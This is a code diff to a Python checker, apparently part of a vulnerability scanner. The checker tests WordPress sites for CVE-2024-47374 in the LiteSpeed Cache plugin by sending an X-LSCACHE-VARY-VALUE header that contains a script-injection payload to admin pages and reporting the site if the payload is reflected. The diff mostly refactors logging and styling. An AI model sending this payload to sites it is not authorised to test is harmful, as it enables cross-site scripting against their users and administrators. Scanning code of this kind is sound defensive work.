@@ -1,12 +1,11 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 """
 https://blog.ostorlab.co/litespeed-cache,cve-2024-47374.html
 """
 
-from utils.utils import requests, random, sys, configure_logger
-from utils.style import Identify
+from utils.style import Colors, Identify
+from utils.utils import configure_logger, requests, sys
 
 logger = configure_logger(__name__)
 
@@ -19,7 +18,7 @@ PAGES = [
     'wp-admin/admin.php?page=lscache-advanced'
 ]
 
-def litespeed(base_url):
+def litespeed(base_url: str) -> None:
     headers = {
         'X-LSCACHE-VARY-VALUE': '"><script>alert("CVE-2024-47374")</script>'
     }
@@ -29,15 +28,12 @@ def litespeed(base_url):
         try:
             response = requests.get(target_url, headers=headers, verify=False, timeout=10)
             if 'CVE-2024-47374' in response.text:
-                print(f" {Identify.confirmed} | CVE-2024-47374| \033[34m{target_url}\033[0m | PAYLOAD: {headers}")
-        except requests.Timeout:
-            #print(f"request timeout {url} {p}")
-            pass
+                print(f" {Identify.confirmed} | CVE-2024-47374| {Colors.BLUE}{target_url}{Colors.RESET} | PAYLOAD: {headers}")
+        except requests.Timeout as t:
+            logger.exception(f"request timeout {base_url}", t)
         except KeyboardInterrupt:
             print("Exiting")
             sys.exit()
         except Exception as e:
-            #print(f"Error : {e}")
-            logger.exception(e)
-            pass
+            logger.exception(f"request error {base_url}", e)
 
